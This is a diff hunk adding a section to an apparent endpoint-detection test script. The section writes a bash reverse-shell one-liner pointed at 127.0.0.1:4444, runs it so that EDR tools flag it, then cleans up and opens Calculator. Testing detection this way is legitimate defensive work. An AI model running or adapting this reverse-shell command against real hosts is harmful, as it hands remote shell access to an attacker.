@@ -46,6 +46,24 @@ git push
 cd ../..
 rm -rf repo-copy
 
+# Reverse Shell
+# Setup test directory
+mkdir -p /tmp/cs_test_trigger
+cd /tmp/cs_test_trigger || exit 1
+
+# Create a reverse shell using suspicious bash syntax
+cat << 'EOF' > revshell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+EOF
+
+# Mark it executable
+chmod +x revshell.sh
+
+# Execute it — this should look very bad to EDRs
+./revshell.sh
+
+rm -rf /tmp/cs_test_trigger
 
 # Visual indicator
 open -a Calculator
